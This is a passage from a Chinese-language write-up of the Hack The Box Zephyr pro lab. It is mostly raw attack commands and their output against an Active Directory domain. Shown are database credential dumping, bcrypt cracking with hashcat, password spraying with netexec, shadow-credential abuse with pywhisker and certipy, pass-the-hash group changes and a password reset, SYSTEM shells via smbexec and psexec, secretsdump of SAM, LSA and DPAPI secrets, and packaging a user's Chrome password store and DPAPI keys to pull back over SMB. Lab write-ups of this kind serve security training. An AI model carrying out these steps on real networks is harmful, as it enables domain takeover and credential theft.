root@zephyr:/#  mysql -uzabbix -prDhHbBEfh35sMbkY

mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 808
Server version: 8.0.40-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

## 用户凭据
```plain
mysql> use zabbix;
Database changed

mysql> select * from users;
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+-----------------+---------------+---------------+----------+--------+
| userid | username | name   | surname       | passwd                                                       | url | autologin | autologout | lang    | refresh | theme   | attempt_failed | attempt_ip      | attempt_clock | rows_per_page | timezone | roleid |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+-----------------+---------------+---------------+----------+--------+
|      1 | Admin    | Zabbix | Administrator | $2y$10$BH90bGVo2lv948WpM1haruzrBgVCpzEL5av9BPCewd/Q2pM1Ybl.q |     |         1 | 0          | default | 30s     | default |              0 | 192.168.210.100 |    1647985367 |            50 | default  |      3 |
|      2 | guest    |        |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |     |         0 | 15m        | default | 30s     | default |              0 |                 |             0 |            50 | default  |      4 |
|      5 | marcus   | Marcus | Thompson      | $2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4. |     |         0 | 0          | default | 30s     | default |              0 |                 |             0 |            50 | default  |      2 |
+--------+----------+--------+---------------+--------------------------------------------------------------+-----+-----------+------------+---------+---------+---------+----------------+-----------------+---------------+---------------+----------+--------+
3 rows in set (0.00 sec)
```

> 拿到**bcrypt hash**
>

| 部分 | 含义 |
| --- | --- |
| $2y$ | bcrypt |
| 10 | cost（强度） |
| 后面 | hash |


## hashcat
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# cat zabbix_hash
$2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4.

                                                                                                       
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# hashcat -m 3200 zabbix_hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

$2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4.:!QAZ2wsx
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA...eXhm4.
Time.Started.....: Sat Mar 21 15:53:19 2026 (3 mins, 12 secs)
Time.Estimated...: Sat Mar 21 15:56:31 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       73 H/s (6.66ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 13904/14344385 (0.10%)
Rejected.........: 0/13904 (0.00%)
Restore.Point....: 13888/14344385 (0.10%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: 012012 -> sidekick2
Hardware.Mon.#01.: Util: 84%

Started: Sat Mar 21 15:52:43 2026
Stopped: Sat Mar 21 15:56:32 2026
```

```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# hashcat -m 3200 zabbix_hash --show
$2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4.:!QAZ2wsx
```

得到凭据marcus/!QAZ2wsx

## marcus-横向移动
### netexec-smb
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q netexec smb 192.168.210.1/24 -u 'marcus' -p '!QAZ2wsx'                     
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.14  445    ZPH-SVRADFS1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRADFS1) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.12  445    ZPH-SVRCA01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCA01) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRMGMT1) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.15  445    ZPH-SVRSQL01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:ZPH-SVRSQL01) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] zsm.local\marcus:!QAZ2wsx 
SMB         192.168.210.14  445    ZPH-SVRADFS1     [+] zsm.local\marcus:!QAZ2wsx 
SMB         192.168.210.16  445    ZPH-SVRCDC01     [-] internal.zsm.local\marcus:!QAZ2wsx STATUS_LOGON_FAILURE
SMB         192.168.210.12  445    ZPH-SVRCA01      [+] zsm.local\marcus:!QAZ2wsx 
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [+] zsm.local\marcus:!QAZ2wsx 
SMB         192.168.210.15  445    ZPH-SVRSQL01     [+] zsm.local\marcus:!QAZ2wsx 
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

### Kerberoast
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-GetUserSPNs zsm.local/marcus:'!QAZ2wsx' -dc-ip 192.168.210.10 -request
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

### hosts
```plain
192.168.210.10 ZPH-SVRDC01.zsm.local zsm.local
```

### resolv.conf
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# cat /etc/resolv.conf                                                
# Generated by NetworkManager
search zsm.local
nameserver 192.168.210.10
```

### bloodhound-python
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr/blood]
└─# proxychains -q bloodhound-python -u marcus -p '!QAZ2wsx' -d zsm.local -dc ZPH-SVRDC01.zsm.local --dns-tcp -ns 192.168.210.10 --zip -c all
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: zsm.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: ZPH-SVRDC01.zsm.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 6 computers
INFO: Connecting to LDAP server: ZPH-SVRDC01.zsm.local
INFO: Connecting to GC LDAP server: zph-svrdc01.zsm.local
INFO: Found 10 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 6 ous
INFO: Found 20 containers
INFO: Found 2 trusts
WARNING: Could not resolve GPO link to cn={F76A9F99-FA58-4E0E-AE7C-4FED10F07073},cn=policies,cn=system,DC=zsm,DC=local
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: ZPH-SVRMGMT1.zsm.local
INFO: Querying computer: ZPH-SVRSQL01.zsm.local
INFO: Querying computer: ZPH-SVRADFS1.zsm.local
INFO: Querying computer: Maintenance.zsm.local
INFO: Querying computer: ZPH-SVRDC01.zsm.local
INFO: Querying computer: ZPH-SVRCA01.zsm.local
INFO: Done in 01M 26S
INFO: Compressing output into 20260321161707_bloodhound.zip
```

### bloodhound
![](/image/hackthebox-prolabs/Zephyr-17.png)

![](/image/hackthebox-prolabs/Zephyr-18.png)

![](/image/hackthebox-prolabs/Zephyr-19.png)

![](/image/hackthebox-prolabs/Zephyr-20.png)

![](/image/hackthebox-prolabs/Zephyr-21.png)

优先使用MARCUS@ZSM.LOCAL进行AddKeyCredentialLink对ZPH-SVRMGMT1.ZSM.LOCAL

### AddKeyCredentialLink
[AddKeyCredentialLink - SpecterOps](https://bloodhound.specterops.io/resources/edges/add-key-credential-link)

[GitHub - ShutdownRepo/pywhisker: Python version of the C# tool for “Shadow Credentials” attacks](https://github.com/ShutdownRepo/pywhisker)

#### pywhisker
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q python /home/kali/Desktop/tools/pywhisker/pywhisker/pywhisker.py -d zsm.local -u marcus -p '!QAZ2wsx' -t 'ZPH-SVRMGMT1$' --dc-ip 192.168.210.10 -a add
[*] Searching for the target account
[*] Target user found: CN=ZPH-SVRMGMT1,CN=Computers,DC=zsm,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 5c4482e9-5443-26fa-a11e-446bd3bd7d94
[*] Updating the msDS-KeyCredentialLink attribute of ZPH-SVRMGMT1$
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: uPlfcTWi.pfx
[+] PFX exportiert nach: uPlfcTWi.pfx
[i] Passwort für PFX: AomW1nfmOxnfHJSe8bq4
[+] Saved PFX (#PKCS12) certificate & key at path: uPlfcTWi.pfx
[*] Must be used with password: AomW1nfmOxnfHJSe8bq4
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

>  👉 **控制了这台机器账户的身份认证（无密码登录）**
>
> ** **👉** 用证书登录 AD（绕过密码）**
>

#### 方法一：票据生成
##### Gettgtpkinit  
```plain
proxychains -q python3 /home/kali/Desktop/tools/PKINITtools-master/gettgtpkinit.py \
-cert-pfx uPlfcTWi.pfx \
-pfx-pass AomW1nfmOxnfHJSe8bq4 \
-dc-ip 192.168.210.10 \
zsm.local/ZPH-SVRMGMT1$ \
ZPH-SVRMGMT1.ccache
2026-03-21 17:59:36,200 minikerberos INFO     Loading certificate and key from file
2026-03-21 17:59:36,220 minikerberos INFO     Requesting TGT
2026-03-21 17:59:55,649 minikerberos INFO     AS-REP encryption key (you might need this later):
2026-03-21 17:59:55,649 minikerberos INFO     d0de5fd9555eea9b513849bf6c8fcbb47d414f5cb72281b9f6ff76a53a4f6123
2026-03-21 17:59:55,657 minikerberos INFO     Saved TGT to file
```

##### 导入票据
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# export KRB5CCNAME=/home/kali/Desktop/htb/zephyr/ZPH-SVRMGMT1.ccache
```

+ 你拥有以 `ZPH-SVRMGMT1$` 身份执行代码/认证的潜力
+ ZPH-SVRMGMT1$ 是计算机账户，不是用户账户。不能用于交互式登录或远程代码执行

#### 方法二：证书哈希
##### 导出无密证书
```plain
certipy cert -export -pfx uPlfcTWi.pfx -password AomW1nfmOxnfHJSe8bq4 -out unprotected.pfx
```

##### PKINIT 认证
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q certipy auth -pfx unprotected.pfx -dc-ip 192.168.210.10 -username 'ZPH-SVRMGMT1$' -domain zsm.local         
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'zph-svrmgmt1$@zsm.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'zph-svrmgmt1.ccache'
[*] Wrote credential cache to 'zph-svrmgmt1.ccache'
[*] Trying to retrieve NT hash for 'zph-svrmgmt1$'
[*] Got hash for 'zph-svrmgmt1$@zsm.local': aad3b435b51404eeaad3b435b51404ee:89d0b56874f61ad38bad336a77b8ef2f
```

### Addmember
> ZPH-SVRMGMT1$ 是计算机账户，不是用户账户。机器账户不能用于交互式登录或远程代码执行
>
> ZPH-SVRMGMT1.ZSM.LOCAL 可以对GENERAL MANAGEMENT@ZSM.LOCAL进行AddMember
>
> GENERAL MANAGEMENT@ZSM.LOCAL 可以对JAMIE@ZSM.LOCAL 进行重置密码
>
> JAMIE@ZSM.LOCAL 可以加入CA MANAGERS@ZSM.LOCAL 用户组
>

#### GENERAL MANAGEMENT
把 `marcus` 加到 `GENERAL MANAGEMENT`：

```bash
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q pth-net rpc group addmem "GENERAL MANAGEMENT" "marcus" -U zsm.local/'zph-svrmgmt1$'%aad3b435b51404eeaad3b435b51404ee:89d0b56874f61ad38bad336a77b8ef2f -S 192.168.210.10
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

确认：

```bash
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q net rpc group members "GENERAL MANAGEMENT" -U zsm.local/marcus%'!QAZ2wsx' -S 192.168.210.10                                                                            
ZSM\marcus
ZSM\jamie
```

#### 重置密码
重置 `jamie` 密码：

```bash
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q net rpc password "jamie" "Pass@123" -U zsm.local/marcus%'!QAZ2wsx' -S 192.168.210.10
```

再把 `jamie` 加到 `CA MANAGERS`：

```bash
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q net rpc group addmem "CA MANAGERS" jamie -U zsm.local/'jamie'%'Pass@123' -S 192.168.210.10
```

确认：

```bash
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q net rpc group members "CA MANAGERS" -U zsm.local/'jamie'%'Pass@123' -S 192.168.210.10
ZSM\ca_svc
ZSM\jamie
```

### Netexec-jamie
```bash
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q netexec smb 192.168.210.1/24 -u "jamie" -p 'Pass@123'
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRMGMT1) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.15  445    ZPH-SVRSQL01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:ZPH-SVRSQL01) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.12  445    ZPH-SVRCA01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCA01) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.14  445    ZPH-SVRADFS1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRADFS1) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [+] zsm.local\jamie:Pass@123 (Pwn3d!)
SMB         192.168.210.10  445    ZPH-SVRDC01      [+] zsm.local\jamie:Pass@123 
SMB         192.168.210.15  445    ZPH-SVRSQL01     [+] zsm.local\jamie:Pass@123 
SMB         192.168.210.16  445    ZPH-SVRCDC01     [-] internal.zsm.local\jamie:Pass@123 STATUS_LOGON_FAILURE
SMB         192.168.210.12  445    ZPH-SVRCA01      [+] zsm.local\jamie:Pass@123 
SMB         192.168.210.14  445    ZPH-SVRADFS1     [+] zsm.local\jamie:Pass@123 
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

# ZPH-SVRMGMT1\jamie-192.168.210.11
## smbexec
```bash
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q smbexec.py jamie:'Pass@123'@192.168.210.11           
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

## Getflag
```bash
C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
ZEPHYR{K3y_Cr3d3n714l_l1nk_d4ng3r}
```

## 域内用户
```bash
C:\Windows\system32>net user /domain
The request will be processed at a domain controller for domain zsm.local.


User accounts for \\ZPH-SVRDC01.zsm.local

-------------------------------------------------------------------------------
Administrator            ca_svc                   daniel.morris            
Guest                    jamie                    krbtgt                   
marcus                   paul.williams            
The command completed with one or more errors.
```

## secretsdump
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-secretsdump jamie:'Pass@123'@192.168.210.11                     
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x90c9f7848607977407f9afabdb3cfcc0
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:545c503123664e5713439e088bd91035:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:68a58eed2cff6a92dd8d2d5b9116be4f:::
[*] Dumping cached domain logon information (domain/username:hash)
ZSM.LOCAL/Administrator:$DCC2$10240#Administrator#04a13c983d1c6f2ee43cc9aa0c4d49c6: (2024-12-12 12:54:22+00:00)
ZSM.LOCAL/marcus:$DCC2$10240#marcus#66dddfc25df0d824e30c55a9ecccb512: (2026-03-21 03:40:14+00:00)
ZSM.LOCAL/jamie:$DCC2$10240#jamie#8eaa1e87b84f7197df2b836fae8e5c3c: (2022-10-28 12:56:42+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
ZSM\ZPH-SVRMGMT1$:aes256-cts-hmac-sha1-96:937391acdbd6a5f63cf0f6700ac25aba7c8d747bcdd437f5efb419a12d8995c7
ZSM\ZPH-SVRMGMT1$:aes128-cts-hmac-sha1-96:d73da5795d36d46bf61b1afb40b247f5
ZSM\ZPH-SVRMGMT1$:des-cbc-md5:46620bf237cb1568
ZSM\ZPH-SVRMGMT1$:plain_password_hex:a59ff2202125f08774455a23ac8e623130743053e98d29eea3234cf4995bc3040b3e86e68c4ce7d681da4614f3b4d6066ce96a1a0257a1dca1221f864fcaf05f617d53ff9e6e7e8afedf8e4e70dd793440a6203fc780bbae017e795f3002958340850257b1caff49bcb045a861c67631dfb7f0ac6525ec72a9fd35035bfa1cb79578a785c08140a10abe5b756c2bcaa06ae1dceb3fe0f315a793c66aeaf35558deafd3d3796674de82fb98ba41878356fdde5ab8fc89dfe8a67c34015d64f03f52d515684b07c1bc9108daa73c6a63f49bf32e6403f850ae7d56ca6f2c49ca82fe414f14c100a2fb7cc901a2f07c52dc
ZSM\ZPH-SVRMGMT1$:aad3b435b51404eeaad3b435b51404ee:89d0b56874f61ad38bad336a77b8ef2f:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x05341d094f374bb97fd82b3a19619bbc3d28e967
dpapi_userkey:0xc4de07634653cdeda95b1baea5a86ceaa9683003
[*] NL$KM 
 0000   95 E8 38 F2 47 8A 41 12  A5 77 CA 0A 23 E6 56 28   ..8.G.A..w..#.V(
 0010   85 56 73 10 A9 49 99 6A  B5 5D FB C5 AD B4 4C 76   .Vs..I.j.]....Lv
 0020   3A 07 D8 40 73 ED EE 03  28 5E A6 02 7E 09 38 EA   :..@s...(^..~.8.
 0030   48 55 7F 6D 9C FD 9A 8B  C1 F1 F4 D7 0A 6F 3B D0   HU.m.........o;.
NL$KM:95e838f2478a4112a577ca0a23e6562885567310a949996ab55dfbc5adb44c763a07d84073edee03285ea6027e0938ea48557f6d9cfd9a8bc1f1f4d70a6f3bd0
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

## psexec
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-psexec zsm.local/jamie:'Pass@123'@192.168.210.11
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.210.11.....
[*] Found writable share ADMIN$
[*] Uploading file aeRilVox.exe
[*] Opening SVCManager on 192.168.210.11.....
[*] Creating service rLdL on 192.168.210.11.....
[*] Starting service rLdL.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.2849]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

## DPAPI解密
### 获取用户 SID
#### 方法一-注册表
```bash
C:\Windows\system32>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList" /s


HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
    Default    REG_EXPAND_SZ    %SystemDrive%\Users\Default
    ProfilesDirectory    REG_EXPAND_SZ    %SystemDrive%\Users
    ProgramData    REG_EXPAND_SZ    %SystemDrive%\ProgramData
    Public    REG_EXPAND_SZ    %SystemDrive%\Users\Public

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-18
    Flags    REG_DWORD    0xc
    ProfileImagePath    REG_EXPAND_SZ    %systemroot%\system32\config\systemprofile
    RefCount    REG_DWORD    0x1
    Sid    REG_BINARY    010100000000000512000000
    State    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-19
    Flags    REG_DWORD    0x0
    ProfileImagePath    REG_EXPAND_SZ    %systemroot%\ServiceProfiles\LocalService
    State    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-20
    Flags    REG_DWORD    0x0
    ProfileImagePath    REG_EXPAND_SZ    %systemroot%\ServiceProfiles\NetworkService
    State    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-2096753681-4207411055-3768775749-500
    ProfileImagePath    REG_EXPAND_SZ    C:\Users\Administrator
    Flags    REG_DWORD    0x0
    FullProfile    REG_DWORD    0x1
    State    REG_DWORD    0x100
    Sid    REG_BINARY    01050000000000051500000011ECF97C6FFFC7FA45F4A2E0F4010000
    LocalProfileLoadTimeLow    REG_DWORD    0x77613729
    LocalProfileLoadTimeHigh    REG_DWORD    0x1db4bde
    ProfileAttemptedProfileDownloadTimeLow    REG_DWORD    0x0
    ProfileAttemptedProfileDownloadTimeHigh    REG_DWORD    0x0
    ProfileLoadTimeLow    REG_DWORD    0x0
    ProfileLoadTimeHigh    REG_DWORD    0x0
    RunLogonScriptSync    REG_DWORD    0x0
    LocalProfileUnloadTimeLow    REG_DWORD    0x77639a7b
    LocalProfileUnloadTimeHigh    REG_DWORD    0x1db4bde

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-2734290894-461713716-141835440-4102
    ProfileImagePath    REG_EXPAND_SZ    C:\Users\marcus
    Flags    REG_DWORD    0x0
    FullProfile    REG_DWORD    0x1
    State    REG_DWORD    0x0
    Sid    REG_BINARY    010500000000000515000000CEF7F9A23431851BB03C740806100000
    Guid    REG_SZ    {1258e3c7-ceda-42af-a337-f749eb943d42}
    LocalProfileLoadTimeLow    REG_DWORD    0x6d99fef5
    LocalProfileLoadTimeHigh    REG_DWORD    0x1dcb8e4
    ProfileAttemptedProfileDownloadTimeLow    REG_DWORD    0x0
    ProfileAttemptedProfileDownloadTimeHigh    REG_DWORD    0x0
    ProfileLoadTimeLow    REG_DWORD    0x0
    ProfileLoadTimeHigh    REG_DWORD    0x0
    RunLogonScriptSync    REG_DWORD    0x0
    LocalProfileUnloadTimeLow    REG_DWORD    0x98f94b31
    LocalProfileUnloadTimeHigh    REG_DWORD    0x1dc8ab7

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-2734290894-461713716-141835440-4602
    ProfileImagePath    REG_EXPAND_SZ    C:\Users\jamie
    Flags    REG_DWORD    0x0
    FullProfile    REG_DWORD    0x1
    State    REG_DWORD    0x0
    Sid    REG_BINARY    010500000000000515000000CEF7F9A23431851BB03C7408FA110000
    Guid    REG_SZ    {c157a46c-a1bd-4f12-9f41-d0271f24df23}
    LocalProfileLoadTimeLow    REG_DWORD    0xba7ff849
    LocalProfileLoadTimeHigh    REG_DWORD    0x1d8eacc
    ProfileAttemptedProfileDownloadTimeLow    REG_DWORD    0x0
    ProfileAttemptedProfileDownloadTimeHigh    REG_DWORD    0x0
    ProfileLoadTimeLow    REG_DWORD    0x0
    ProfileLoadTimeHigh    REG_DWORD    0x0
    RunLogonScriptSync    REG_DWORD    0x0
    LocalProfileUnloadTimeLow    REG_DWORD    0x27ff6966
    LocalProfileUnloadTimeHigh    REG_DWORD    0x1d8eacd

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\S-1-5-21-2734290894-461713716-141835440-500
    ProfileImagePath    REG_EXPAND_SZ    C:\Users\administrator.ZSM
    Flags    REG_DWORD    0x0
    FullProfile    REG_DWORD    0x1
    State    REG_DWORD    0x100
    Sid    REG_BINARY    010500000000000515000000CEF7F9A23431851BB03C7408F4010000
    Guid    REG_SZ    {f6460902-ac53-44d0-85e8-345e82d6040b}
    LocalProfileLoadTimeLow    REG_DWORD    0xc81d3487
    LocalProfileLoadTimeHigh    REG_DWORD    0x1db4b95
    ProfileAttemptedProfileDownloadTimeLow    REG_DWORD    0x0
    ProfileAttemptedProfileDownloadTimeHigh    REG_DWORD    0x0
    ProfileLoadTimeLow    REG_DWORD    0x0
    ProfileLoadTimeHigh    REG_DWORD    0x0
    RunLogonScriptSync    REG_DWORD    0x0
    LocalProfileUnloadTimeLow    REG_DWORD    0xdcec9fa4
    LocalProfileUnloadTimeHigh    REG_DWORD    0x1db4ca2
```

#### 方法二-域控lookupsid
```bash
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q lookupsid.py zsm.local/jamie:'Pass@123'@192.168.210.10

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at 192.168.210.10
[*] StringBinding ncacn_np:192.168.210.10[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2734290894-461713716-141835440
498: ZSM\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: ZSM\Administrator (SidTypeUser)
501: ZSM\Guest (SidTypeUser)
502: ZSM\krbtgt (SidTypeUser)
512: ZSM\Domain Admins (SidTypeGroup)
513: ZSM\Domain Users (SidTypeGroup)
514: ZSM\Domain Guests (SidTypeGroup)
515: ZSM\Domain Computers (SidTypeGroup)
516: ZSM\Domain Controllers (SidTypeGroup)
517: ZSM\Cert Publishers (SidTypeAlias)
518: ZSM\Schema Admins (SidTypeGroup)
519: ZSM\Enterprise Admins (SidTypeGroup)
520: ZSM\Group Policy Creator Owners (SidTypeGroup)
521: ZSM\Read-only Domain Controllers (SidTypeGroup)
522: ZSM\Cloneable Domain Controllers (SidTypeGroup)
525: ZSM\Protected Users (SidTypeGroup)
526: ZSM\Key Admins (SidTypeGroup)
527: ZSM\Enterprise Key Admins (SidTypeGroup)
553: ZSM\RAS and IAS Servers (SidTypeAlias)
571: ZSM\Allowed RODC Password Replication Group (SidTypeAlias)
572: ZSM\Denied RODC Password Replication Group (SidTypeAlias)
1000: ZSM\ZPH-SVRDC01$ (SidTypeUser)
1101: ZSM\DnsAdmins (SidTypeAlias)
1102: ZSM\DnsUpdateProxy (SidTypeGroup)
1104: ZSM\MAINTENANCE$ (SidTypeUser)
1105: ZSM\ZPH-GMSA-ADFS$ (SidTypeUser)
1106: ZSM\ZPH-SVRCA01$ (SidTypeUser)
1107: ZSM\daniel.morris (SidTypeUser)
1108: ZSM\ZPH-SVRADFS1$ (SidTypeUser)
1109: ZSM\PAINTERS$ (SidTypeUser)
1110: ZSM\paul.williams (SidTypeUser)
1601: ZSM\ZPH-SVRSQL01$ (SidTypeUser)
1602: ZSM\internal$ (SidTypeUser)
```

### Chrome 密码库
```bash
C:\Windows\system32>powershell -c "Get-ChildItem -Path 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data' -Force -ErrorAction SilentlyContinue | Select-Object FullName"


FullName                                                                
--------                                                                
C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

### 文件处理
#### 文件打包
+ 在目标机把 Chrome + DPAPI 材料打包到公共目录

```plain
powershell -c "Compress-Archive -LiteralPath 'C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Local State','C:\Users\marcus\AppData\Local\Google\Chrome\User Data\Default\Login Data','C:\Users\marcus\AppData\Roaming\Microsoft\Protect\S-1-5-21-2734290894-461713716-141835440-4102' -DestinationPath 'C:\Users\Public\marcus_chrome_dpapi.zip' -Force"
```

#### smb下载
+ 用 SMB 把包拉回 Kali

```plain
proxychains -q impacket-smbclient 'zsm.local/jamie:Pass@123@192.168.210.11'
```

```plain
use C$
cd \Users\Public
get marcus_chrome_dpapi.zip
```

#### 文件解压
